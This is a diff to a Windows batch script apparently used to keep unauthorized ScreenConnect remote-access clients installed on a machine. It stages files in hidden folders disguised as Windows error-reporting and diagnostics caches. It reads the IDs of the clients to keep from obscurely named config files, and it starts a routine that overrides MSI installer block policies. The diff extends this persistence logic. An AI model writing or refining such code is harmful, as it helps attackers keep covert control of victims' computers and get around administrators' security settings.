@@ -1,15 +1,19 @@
 @echo off
-REM OWN_SECURE BUILD 20260804S12 - dynamic gryxa FP from gryxa.cfg; NO LockDir on SC dirs; SY DELETE+WRITE_DAC
+REM OWN_SECURE BUILD 20260804S13 - sevrz.cfg + gryxa.cfg dynamic FPs; SY DELETE+WRITE_DAC
 setlocal EnableExtensions EnableDelayedExpansion
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
 set "LOG=%WD%\boot.err"
-set "PRIM=ScreenConnect Client (5f6010579852e507)"
-set "ALT=ScreenConnect Client (f861c8140d453427)"
 set "KEEP1=5f6010579852e507"
 set "KEEP2=f861c8140d453427"
 set "KEEP3=36e506ff016b2151"
+if exist "%WD%\sevrz.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\sevrz.cfg") do (
+  if /I "%%K"=="PRIMARY_FP" set "KEEP1=%%L"
+  if /I "%%K"=="ALT_FP" set "KEEP2=%%L"
+)
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
+set "PRIM=ScreenConnect Client (%KEEP1%)"
+set "ALT=ScreenConnect Client (%KEEP2%)"
 set "GRYXA=ScreenConnect Client (%KEEP3%)"
 set "PF=%ProgramFiles%"
 set "PF86=%ProgramFiles(x86)%"
@@ -17,7 +21,7 @@ set "TASKROOT=%SystemRoot%\System32\Tasks"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%WD2%" mkdir "%WD2%" >nul 2>&1
-echo secure_begin %DATE% %TIME% S12>>"%LOG%"
+echo secure_begin %DATE% %TIME% S13>>"%LOG%"
 
 REM --- Neutralize MSI block policies (1625) ---
 REM DisableMSI: 0=allow, 1=non-admin only, 2=all -> force 0
